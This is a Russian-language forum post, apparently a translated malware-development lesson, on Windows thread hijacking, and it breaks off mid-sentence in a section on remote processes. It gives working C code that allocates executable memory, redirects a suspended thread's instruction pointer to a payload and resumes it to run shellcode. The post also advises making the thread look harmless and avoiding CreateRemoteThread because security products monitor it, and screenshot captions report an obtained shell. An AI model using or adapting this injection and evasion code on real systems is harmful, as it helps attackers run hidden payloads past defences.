–°—Ç–æ–∏—Ç –æ—Ç–º–µ—Ç–∏—Ç—å, —á—Ç–æ –Ω–µ–≤–æ–∑–º–æ–∂–Ω–æ –ø–æ—Ö–∏—Ç–∏—Ç—å –≥–ª–∞–≤–Ω—ã–π –ø–æ—Ç–æ–∫ –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞, –ø–æ—Ç–æ–º—É —á—Ç–æ —Ü–µ–ª–µ–≤–æ–π –ø–æ—Ç–æ–∫ —Å–Ω–∞—á–∞–ª–∞ –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å –ø–µ—Ä–µ–≤–µ–¥–µ–Ω –≤ –ø—Ä–∏–æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω–æ–µ —Å–æ—Å—Ç–æ—è–Ω–∏–µ. –≠—Ç–æ –ø—Ä–æ–±–ª–µ–º–∞—Ç–∏—á–Ω–æ –ø—Ä–∏ –Ω–∞—Ü–µ–ª–∏–≤–∞–Ω–∏–∏ –Ω–∞ –≥–ª–∞–≤–Ω—ã–π –ø–æ—Ç–æ–∫, —Ç–∞–∫ –∫–∞–∫ –∏–º–µ–Ω–Ω–æ –æ–Ω –≤—ã–ø–æ–ª–Ω—è–µ—Ç –∫–æ–¥ –∏ –Ω–µ –º–æ–∂–µ—Ç –±—ã—Ç—å –ø—Ä–∏–æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω. –ü–æ—ç—Ç–æ–º—É –Ω–µ —Å—Ç–æ–∏—Ç –Ω–∞—Ü–µ–ª–∏–≤–∞—Ç—å—Å—è –Ω–∞ –≥–ª–∞–≤–Ω—ã–π –ø–æ—Ç–æ–∫ –ø—Ä–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–∏ –ø–æ—Ö–∏—â–µ–Ω–∏—è –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ –ø–æ—Ç–æ–∫–∞.<br />
<br />
–°–Ω–∞—á–∞–ª–∞ –±—É–¥–µ—Ç –≤—ã–∑–≤–∞–Ω–∞ CreateThread –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è –ø–æ—Ç–æ–∫–∞ –∏ —É—Å—Ç–∞–Ω–æ–≤–∫–∏ –±–µ–∑–≤—Ä–µ–¥–Ω–æ–π —Ñ—É–Ω–∫—Ü–∏–∏ –≤ –∫–∞—á–µ—Å—Ç–≤–µ –∑–∞–ø–∏—Å–∏ –ø–æ—Ç–æ–∫–∞. –ó–∞—Ç–µ–º –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä –ø–æ—Ç–æ–∫–∞ –±—É–¥–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã—Ö —à–∞–≥–æ–≤, —á—Ç–æ–±—ã –ø–æ—Ö–∏—Ç–∏—Ç—å –ø–æ—Ç–æ–∫ –∏ –≤—ã–ø–æ–ª–Ω–∏—Ç—å –ø–æ–ª–µ–∑–Ω—É—é –Ω–∞–≥—Ä—É–∑–∫—É.<br />
<br />
<b>–ò–∑–º–µ–Ω–µ–Ω–∏–µ –ö–æ–Ω—Ç–µ–∫—Å—Ç–∞ –ü–æ—Ç–æ–∫–∞</b><br />
<br />
–°–ª–µ–¥—É—é—â–∏–º —à–∞–≥–æ–º —è–≤–ª—è–µ—Ç—Å—è –ø–æ–ª—É—á–µ–Ω–∏–µ –∫–æ–Ω—Ç–µ–∫—Å—Ç–∞ –ø–æ—Ç–æ–∫–∞ —Å —Ü–µ–ª—å—é –µ–≥–æ –∏–∑–º–µ–Ω–µ–Ω–∏—è –∏ —É–∫–∞–∑–∞–Ω–∏—è –Ω–∞ –ø–æ–ª–µ–∑–Ω—É—é –Ω–∞–≥—Ä—É–∑–∫—É. –ö–æ–≥–¥–∞ –ø–æ—Ç–æ–∫ –≤–æ–∑–æ–±–Ω–æ–≤–ª—è–µ—Ç –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ, –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è –ø–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞.<br />
<br />
–ö–∞–∫ –±—ã–ª–æ —É–ø–æ–º—è–Ω—É—Ç–æ —Ä–∞–Ω–µ–µ, GetThreadContext –±—É–¥–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è —Å—Ç—Ä—É–∫—Ç—É—Ä—ã CONTEXT —Ü–µ–ª–µ–≤–æ–≥–æ –ø–æ—Ç–æ–∫–∞. –ù–µ–∫–æ—Ç–æ—Ä—ã–µ –∑–Ω–∞—á–µ–Ω–∏—è —Å—Ç—Ä—É–∫—Ç—É—Ä—ã –±—É–¥—É—Ç –∏–∑–º–µ–Ω–µ–Ω—ã, —á—Ç–æ–±—ã –∏–∑–º–µ–Ω–∏—Ç—å –∫–æ–Ω—Ç–µ–∫—Å—Ç —Ç–µ–∫—É—â–µ–≥–æ –ø–æ—Ç–æ–∫–∞ —Å –ø–æ–º–æ—â—å—é SetThreadContext.<br />
–ó–Ω–∞—á–µ–Ω–∏—è, –∫–æ—Ç–æ—Ä—ã–µ –º–µ–Ω—è—é—Ç—Å—è –≤ —Å—Ç—Ä—É–∫—Ç—É—Ä–µ, —Ä–µ—à–∞—é—Ç, —á—Ç–æ –ø–æ—Ç–æ–∫ –±—É–¥–µ—Ç –≤—ã–ø–æ–ª–Ω—è—Ç—å –¥–∞–ª–µ–µ. –≠—Ç–æ –∑–Ω–∞—á–µ–Ω–∏—è —Ä–µ–≥–∏—Å—Ç—Ä–æ–≤ RIP (–¥–ª—è 64-–±–∏—Ç–Ω—ã—Ö –ø—Ä–æ—Ü–µ—Å—Å–æ—Ä–æ–≤) –∏–ª–∏ EIP (–¥–ª—è 32-–±–∏—Ç–Ω—ã—Ö –ø—Ä–æ—Ü–µ—Å—Å–æ—Ä–æ–≤).<br />
<br />
–†–µ–≥–∏—Å—Ç—Ä—ã RIP –∏ EIP, —Ç–∞–∫–∂–µ –∏–∑–≤–µ—Å—Ç–Ω—ã–µ –∫–∞–∫ —Ä–µ–≥–∏—Å—Ç—Ä—ã —É–∫–∞–∑–∞—Ç–µ–ª–µ–π –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–π, —É–∫–∞–∑—ã–≤–∞—é—Ç –Ω–∞ —Å–ª–µ–¥—É—é—â—É—é –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏—é –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è. –û–Ω–∏ –æ–±–Ω–æ–≤–ª—è—é—Ç—Å—è –ø–æ—Å–ª–µ –∫–∞–∂–¥–æ–π –≤—ã–ø–æ–ª–Ω–µ–Ω–Ω–æ–π –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–∏.<br />
<br />
<b>–ü—Ä–∏–º–µ—Ä —Ñ—É–Ω–∫—Ü–∏–∏ –ø–æ—Ö–∏—â–µ–Ω–∏—è –ø–æ—Ç–æ–∫–∞ RunViaClassicThreadHijacking </b>- —ç—Ç–æ —Å–ø–µ—Ü–∏–∞–ª—å–Ω–æ —Å–æ–∑–¥–∞–Ω–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è, –∫–æ—Ç–æ—Ä–∞—è –≤—ã–ø–æ–ª–Ω—è–µ—Ç –ø–æ—Ö–∏—â–µ–Ω–∏–µ –ø–æ—Ç–æ–∫–∞.<br />
<br />
–§—É–Ω–∫—Ü–∏—è —Ç—Ä–µ–±—É–µ—Ç 3 –∞—Ä–≥—É–º–µ–Ω—Ç–∞:<br />
<br />
hThread - –î–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä –ø—Ä–∏–æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω–æ–≥–æ –ø–æ—Ç–æ–∫–∞, –∫–æ—Ç–æ—Ä—ã–π –±—É–¥–µ—Ç –ø–æ—Ö–∏—â–µ–Ω.<br />
pPayload - –£–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ –±–∞–∑–æ–≤—ã–π –∞–¥—Ä–µ—Å –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏.<br />
sPayloadSize - –†–∞–∑–º–µ—Ä –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL RunViaClassicThreadHijacking(IN HANDLE hThread, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {

    PVOID    pAddress         = NULL;
    DWORD    dwOldProtection  = NULL;
    CONTEXT  ThreadCtx        = {
        .ContextFlags = CONTEXT_CONTROL
    };

    // Allocating memory for the payload
    pAddress = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pAddress == NULL){
        printf(&quot;[!] VirtualAlloc Failed With Error : %d \n&quot;, GetLastError());
        return FALSE;
    }

    // Copying the payload to the allocated memory
    memcpy(pAddress, pPayload, sPayloadSize);

    // Changing the memory protection
    if (!VirtualProtect(pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &amp;dwOldProtection)) {
        printf(&quot;[!] VirtualProtect Failed With Error : %d \n&quot;, GetLastError());
        return FALSE;
    }

    // Getting the original thread context
    if (!GetThreadContext(hThread, &amp;ThreadCtx)){
        printf(&quot;[!] GetThreadContext Failed With Error : %d \n&quot;, GetLastError());
        return FALSE;
    }

    // Updating the next instruction pointer to be equal to the payload&#039;s address
    ThreadCtx.Rip = pAddress;

    // Updating the new thread context
    if (!SetThreadContext(hThread, &amp;ThreadCtx)) {
        printf(&quot;[!] SetThreadContext Failed With Error : %d \n&quot;, GetLastError());
        return FALSE;
    }

    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>–ü—Ä–∏–º–µ—Ä –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è</b><br />
<br />
–ü–æ—Å–∫–æ–ª—å–∫—É RunViaClassicThreadHijacking —Ç—Ä–µ–±—É–µ—Ç –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä –ø–æ—Ç–æ–∫–∞, –≥–ª–∞–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è –¥–æ–ª–∂–Ω–∞ –±—É–¥–µ—Ç –µ–≥–æ –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–∏—Ç—å. –ö–∞–∫ —É–∂–µ —É–ø–æ–º–∏–Ω–∞–ª–æ—Å—å —Ä–∞–Ω–µ–µ, —Ü–µ–ª–µ–≤–æ–π –ø–æ—Ç–æ–∫ –¥–æ–ª–∂–µ–Ω –Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –≤ –ø—Ä–∏–æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω–æ–º —Å–æ—Å—Ç–æ—è–Ω–∏–∏, —á—Ç–æ–±—ã RunViaClassicThreadHijacking —É—Å–ø–µ—à–Ω–æ –ø–æ—Ö–∏—Ç–∏–ª –ø–æ—Ç–æ–∫.<br />
<br />
–î–ª—è —Å–æ–∑–¥–∞–Ω–∏—è –Ω–æ–≤–æ–≥–æ –ø–æ—Ç–æ–∫–∞ –±—É–¥–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω WinAPI CreateThread. –ù–æ–≤—ã–π –ø–æ—Ç–æ–∫ –¥–æ–ª–∂–µ–Ω –≤—ã–≥–ª—è–¥–µ—Ç—å –º–∞–∫—Å–∏–º–∞–ª—å–Ω–æ –±–µ–∑–æ–±–∏–¥–Ω–æ, —á—Ç–æ–±—ã –∏–∑–±–µ–∂–∞—Ç—å –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è. –≠—Ç–æ –º–æ–∂–Ω–æ –¥–æ—Å—Ç–∏—á—å, —Å–æ–∑–¥–∞–≤ –±–µ–∑–æ–±–∏–¥–Ω—É—é —Ñ—É–Ω–∫—Ü–∏—é, –∫–æ—Ç–æ—Ä–∞—è –±—É–¥–µ—Ç –≤—ã–ø–æ–ª–Ω—è—Ç—å—Å—è —ç—Ç–∏–º –Ω–æ–≤—ã–º –ø–æ—Ç–æ–∫–æ–º.<br />
<br />
–°–ª–µ–¥—É—é—â–∏–º —à–∞–≥–æ–º —è–≤–ª—è–µ—Ç—Å—è –ø—Ä–∏–æ—Å—Ç–∞–Ω–æ–≤–∫–∞ –Ω–æ–≤–æ–≥–æ –ø–æ—Ç–æ–∫–∞, —á—Ç–æ–±—ã GetThreadContext –∑–∞–≤–µ—Ä—à–∏–ª—Å—è —É—Å–ø–µ—à–Ω–æ. –≠—Ç–æ –º–æ–∂–Ω–æ —Å–¥–µ–ª–∞—Ç—å –¥–≤—É–º—è —Å–ø–æ—Å–æ–±–∞–º–∏:<br />
<ol>
<li data-xf-list-type="ol">–ü–µ—Ä–µ–¥–∞—á–∞ —Ñ–ª–∞–≥–∞ CREATE_SUSPENDED –≤ –ø–∞—Ä–∞–º–µ—Ç—Ä dwCreationFlags CreateThread. –≠—Ç–æ—Ç —Ñ–ª–∞–≥ —Å–æ–∑–¥–∞–µ—Ç –ø–æ—Ç–æ–∫ –≤ –ø—Ä–∏–æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω–æ–º —Å–æ—Å—Ç–æ—è–Ω–∏–∏.</li>
<li data-xf-list-type="ol">–°–æ–∑–¥–∞–Ω–∏–µ –æ–±—ã—á–Ω–æ–≥–æ –ø–æ—Ç–æ–∫–∞, –Ω–æ –µ–≥–æ –ø–æ—Å–ª–µ–¥—É—é—â–∞—è –ø—Ä–∏–æ—Å—Ç–∞–Ω–æ–≤–∫–∞ —Å –ø–æ–º–æ—â—å—é WinAPI SuspendThread.</li>
</ol>–ë—É–¥–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω –ø–µ—Ä–≤—ã–π –º–µ—Ç–æ–¥, —Ç–∞–∫ –∫–∞–∫ –æ–Ω —Ç—Ä–µ–±—É–µ—Ç –º–µ–Ω—å—à–µ –≤—ã–∑–æ–≤–æ–≤ WinAPI. –û–¥–Ω–∞–∫–æ –æ–±–∞ –º–µ—Ç–æ–¥–∞ –ø–æ—Ç—Ä–µ–±—É—é—Ç –≤–æ–∑–æ–±–Ω–æ–≤–ª–µ–Ω–∏—è –ø–æ—Ç–æ–∫–∞ –ø–æ—Å–ª–µ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è RunViaClassicThreadHijacking. –≠—Ç–æ –±—É–¥–µ—Ç –¥–æ—Å—Ç–∏–≥–Ω—É—Ç–æ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º WinAPI ResumeThread, –∫–æ—Ç–æ—Ä—ã–π —Ç—Ä–µ–±—É–µ—Ç —Ç–æ–ª—å–∫–æ –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä –ø—Ä–∏–æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω–æ–≥–æ –ø–æ—Ç–æ–∫–∞.<br />
<br />
<b>–ì–ª–∞–≤–Ω–∞—è –§—É–Ω–∫—Ü–∏—è</b><br />
<br />
–í –≥–ª–∞–≤–Ω–æ–π —Ñ—É–Ω–∫—Ü–∏–∏ –±—É–¥–µ—Ç —Å–æ–∑–¥–∞–Ω –±–µ–∑–æ–±–∏–¥–Ω—ã–π –ø–æ—Ç–æ–∫, –∫–æ—Ç–æ—Ä—ã–π —Å–Ω–∞—á–∞–ª–∞ –±—É–¥–µ—Ç –≤—ã–ø–æ–ª–Ω—è—Ç—å –±–µ–∑–æ–±–∏–¥–Ω—É—é –∑–∞–≥–ª—É—à–µ—á–Ω—É—é —Ñ—É–Ω–∫—Ü–∏—é, –∫–æ—Ç–æ—Ä—É—é –∑–∞—Ç–µ–º –±—É–¥—É—Ç –ø–æ—Ö–∏—â–∞—Ç—å —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º RunViaClassicThreadHijacking –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>int main() {

    HANDLE hThread = NULL;

    // –°–æ–∑–¥–∞–Ω–∏–µ –±–µ–∑–æ–±–∏–¥–Ω–æ–≥–æ –ø–æ—Ç–æ–∫–∞ –≤ –ø—Ä–∏–æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω–æ–º —Å–æ—Å—Ç–æ—è–Ω–∏–∏
    hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE) &amp;DummyFunction, NULL, CREATE_SUSPENDED, NULL);
    if (hThread == NULL) {
        printf(&quot;[!] CreateThread Failed With Error : %d \n&quot;, GetLastError());
        return FALSE;
    }

    // –ü–æ—Ö–∏—â–µ–Ω–∏–µ —Å–æ–∑–¥–∞–Ω–Ω–æ–≥–æ –ø–æ—Ç–æ–∫–∞
    if (!RunViaClassicThreadHijacking(hThread, Payload, sizeof(Payload))) {
        return -1;
    }

    // –í–æ–∑–æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ –ø—Ä–∏–æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω–æ–≥–æ –ø–æ—Ç–æ–∫–∞, —á—Ç–æ–±—ã –æ–Ω –≤—ã–ø–æ–ª–Ω–∏–ª –Ω–∞—à —à–µ–ª–ª–∫–æ–¥
    ResumeThread(hThread);

    printf(&quot;[#] Press &lt;Enter&gt; To Quit ... &quot;);
    getchar();

    return 0;
}</code></pre>
	</div>
</div><br />
<b>–î–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏—è</b><br />
<br />
mainCRTStartup - —ç—Ç–æ –≥–ª–∞–≤–Ω—ã–π –ø–æ—Ç–æ–∫, –≤—ã–ø–æ–ª–Ω—è—é—â–∏–π –≥–ª–∞–≤–Ω—É—é —Ñ—É–Ω–∫—Ü–∏—é, –∞ –ø–æ—Ç–æ–∫ DummyFunction - —ç—Ç–æ –ø–æ—Ç–æ–∫, –∫–æ—Ç–æ—Ä—ã–π –º—ã –ø–æ—Ö–∏—â–∞–µ–º.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746781090699.png"
		data-src="https://osint42.org/attachments/1746781090699-png.122/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746781090699-png.122/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746781090699.png"
			title="1746781090699.png"
			width="1064" height="564" loading="lazy" />
	</div><br />
<br />
–£—Å–ø–µ—à–Ω—ã–π –∫–æ–Ω–Ω–µ–∫—Ç —Å —à–µ–ª–ª–æ–º<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746781098037.png"
		data-src="https://osint42.org/attachments/1746781098037-png.123/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746781098037-png.123/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746781098037.png"
			title="1746781098037.png"
			width="1151" height="256" loading="lazy" />
	</div><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746781107066.png"
		data-src="https://osint42.org/attachments/1746781107066-png.124/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746781107066-png.124/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746781107066.png"
			title="1746781107066.png"
			width="1237" height="487" loading="lazy" />
	</div><br />
<br />
<b>–ü–æ—Ö–∏—â–µ–Ω–∏–µ –ü–æ—Ç–æ–∫–∞ - –°–æ–∑–¥–∞–Ω–∏–µ –£–¥–∞–ª–µ–Ω–Ω–æ–≥–æ –ü–æ—Ç–æ–∫–∞</b><br />
<br />
–î–∞–≤–∞–π—Ç–µ —Ç–µ–ø–µ—Ä—å –ø–æ–ø—Ä–æ–±—É–µ–º —Ç—É –∂–µ —Ç–µ—Ö–Ω–∏–∫—É –¥–ª—è —É–¥–∞–ª–µ–Ω–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞, –∞ –Ω–µ –¥–ª—è –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ.<br />
<br />
–ï—â–µ –æ–¥–Ω–æ –∑–∞–º–µ—Ç–Ω–æ–µ —Ä–∞–∑–ª–∏—á–∏–µ –∑–∞–∫–ª—é—á–∞–µ—Ç—Å—è –≤ —Ç–æ–º,<b><u> —á—Ç–æ –∂–µ—Ä—Ç–≤–µ–Ω–Ω—ã–π –ø–æ—Ç–æ–∫ –Ω–µ –±—É–¥–µ—Ç —Å–æ–∑–¥–∞–Ω –≤ —É–¥–∞–ª–µ–Ω–Ω–æ–º –ø—Ä–æ—Ü–µ—Å—Å–µ. </u></b>–•–æ—Ç—è —ç—Ç–æ –º–æ–∂–Ω–æ —Å–¥–µ–ª–∞—Ç—å —Å –ø–æ–º–æ—â—å—é –≤—ã–∑–æ–≤–∞ WinAPI CreateRemoteThread, —ç—Ç–æ —Ñ—É–Ω–∫—Ü–∏—è, –∫–æ—Ç–æ—Ä–∞—è —á–∞—Å—Ç–æ –∑–ª–æ—É–ø–æ—Ç—Ä–µ–±–ª—è–µ—Ç—Å—è, <b>–∏ –ø–æ—ç—Ç–æ–º—É –æ–Ω–∞ –∞–∫—Ç–∏–≤–Ω–æ –º–æ–Ω–∏—Ç–æ—Ä–∏—Ç—Å—è —Å–∏—Å—Ç–µ–º–∞–º–∏ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏.</b><br />
<br />
–õ—É—á—à–∏–π –ø–æ–¥—Ö–æ–¥ –∑–∞–∫–ª—é—á–∞–µ—Ç—Å—è –≤ —Å–æ–∑–¥–∞–Ω–∏–∏ –∂–µ—Ä—Ç–≤–µ–Ω–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞ –≤ –ø—Ä–∏–æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω–æ–º —Å–æ—Å—Ç–æ—è–Ω–∏–∏ —Å –ø–æ–º–æ—â—å—é CreateProcess, –∫–æ—Ç–æ—Ä—ã–π —Å–æ–∑–¥–∞–µ—Ç –≤—Å–µ —Å–≤–æ–∏ –ø–æ—Ç–æ–∫–∏ –≤ –ø—Ä–∏–æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω–æ–º —Å–æ—Å—Ç–æ—è–Ω–∏–∏, —á—Ç–æ –ø–æ–∑–≤–æ–ª—è–µ—Ç –∏—Ö –ø–æ—Ö–∏—â–∞—Ç—å.<br />
<br />
<b>–®–∞–≥–∏ –ü–æ—Ö–∏—â–µ–Ω–∏—è –£–¥–∞–ª–µ–Ω–Ω–æ–≥–æ –ü–æ—Ç–æ–∫–∞</b><br />
<br />
–í —ç—Ç–æ–º —Ä–∞–∑–¥–µ–ª–µ –æ–ø–∏—Å—ã–≤–∞—é—Ç—Å—è –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã–µ —à–∞–≥–∏ –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –ø–æ—Ö–∏—â–µ–Ω–∏—è –ø–æ—Ç–æ–∫–∞, –Ω–∞—Ö–æ–¥—è—â–µ–≥–æ—Å—è –≤ —É–¥–∞–ª–µ–Ω–Ω–æ–º –ø—Ä–æ—Ü–µ—Å—Å–µ.<br />
<br />
<b>WinAPI CreateProcess CreateProcess</b><br />
<br />
–≠—Ç–æ –º–æ—â–Ω—ã–π –∏ –≤–∞–∂–Ω—ã–π WinAPI, –∏–º–µ—é—â–∏–π —Ä–∞–∑–ª–∏—á–Ω—ã–µ –ø—Ä–∏–º–µ–Ω–µ–Ω–∏—è. –î–ª—è —Ç–æ–≥–æ —á—Ç–æ–±—ã –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–∏ –∏–º–µ–ª–∏ —Ç–≤–µ—Ä–¥–æ–µ –ø–æ–Ω–∏–º–∞–Ω–∏–µ, –Ω–∏–∂–µ –æ–±—ä—è—Å–Ω–µ–Ω—ã –≤–∞–∂–Ω—ã–µ –ø–∞—Ä–∞–º–µ—Ç—Ä—ã —Ñ—É–Ω–∫—Ü–∏–∏.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL CreateProcessA(
  [in, optional]      LPCSTR                lpApplicationName,
  [in, out, optional] LPSTR                 lpCommandLine,
  [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,
  [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,
  [in]                BOOL                  bInheritHandles,
  [in]                DWORD                 dwCreationFlags,
  [in, optional]      LPVOID                lpEnvironment,
  [in, optional]      LPCSTR                lpCurrentDirectory,
  [in]                LPSTARTUPINFOA        lpStartupInfo,
  [out]               LPPROCESS_INFORMATION lpProcessInformation
);</code></pre>
	</div>
</div><br />
–ü–∞—Ä–∞–º–µ—Ç—Ä—ã lpApplicationName –∏ lpCommandLine –ø—Ä–µ–¥—Å—Ç–∞–≤–ª—è—é—Ç —Å–æ–±–æ–π –∏–º—è –ø—Ä–æ—Ü–µ—Å—Å–∞ –∏ –µ–≥–æ –∞—Ä–≥—É–º–µ–Ω—Ç—ã –∫–æ–º–∞–Ω–¥–Ω–æ–π —Å—Ç—Ä–æ–∫–∏ —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤–µ–Ω–Ω–æ. –ù–∞–ø—Ä–∏–º–µ—Ä, lpApplicationName –º–æ–∂–µ—Ç –±—ã—Ç—å C:\Windows\System32\cmd.exe, –∞ lpCommandLine –º–æ–∂–µ—Ç –±—ã—Ç—å /k whoami.<br />
–í –∫–∞—á–µ—Å—Ç–≤–µ –∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤—ã, lpApplicationName –º–æ–∂–µ—Ç –±—ã—Ç—å —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω –≤ NULL, –Ω–æ lpCommandLine –º–æ–∂–µ—Ç —Å–æ–¥–µ—Ä–∂–∞—Ç—å –∏–º—è –ø—Ä–æ—Ü–µ—Å—Å–∞ –∏ –µ–≥–æ –∞—Ä–≥—É–º–µ–Ω—Ç—ã, C:\Windows\System32\cmd.exe /k whoami. –û–±–∞ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞ –ø–æ–º–µ—á–µ–Ω—ã –∫–∞–∫ –Ω–µ–æ–±—è–∑–∞—Ç–µ–ª—å–Ω—ã–µ, —á—Ç–æ –æ–∑–Ω–∞—á–∞–µ—Ç, —á—Ç–æ –¥–ª—è –Ω–æ–≤–æ—Å–æ–∑–¥–∞–Ω–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞ –Ω–µ —Ç—Ä–µ–±—É—é—Ç—Å—è –Ω–∏–∫–∞–∫–∏–µ –∞—Ä–≥—É–º–µ–Ω—Ç—ã.<br />
<br />
dwCreationFlags - —ç—Ç–æ –ø–∞—Ä–∞–º–µ—Ç—Ä, –∫–æ—Ç–æ—Ä—ã–π –∫–æ–Ω—Ç—Ä–æ–ª–∏—Ä—É–µ—Ç –∫–ª–∞—Å—Å –ø—Ä–∏–æ—Ä–∏—Ç–µ—Ç–∞ –∏ —Å–æ–∑–¥–∞–Ω–∏–µ –ø—Ä–æ—Ü–µ—Å—Å–∞. –í–æ–∑–º–æ–∂–Ω—ã–µ –∑–Ω–∞—á–µ–Ω–∏—è –¥–ª—è —ç—Ç–æ–≥–æ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞ –º–æ–∂–Ω–æ –Ω–∞–π—Ç–∏ –∑–¥–µ—Å—å (–ø—Ä–∏–º–µ—á–∞–Ω–∏–µ: —Å—Å—ã–ª–∫–∞ –Ω–µ –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª–µ–Ω–∞ –≤ –∏—Å—Ö–æ–¥–Ω–æ–º —Ç–µ–∫—Å—Ç–µ). –ù–∞–ø—Ä–∏–º–µ—Ä, –∏—Å–ø–æ–ª—å–∑—É—è —Ñ–ª–∞–≥ CREATE_SUSPENDED, —Å–æ–∑–¥–∞–µ—Ç—Å—è –ø—Ä–æ—Ü–µ—Å—Å –≤ 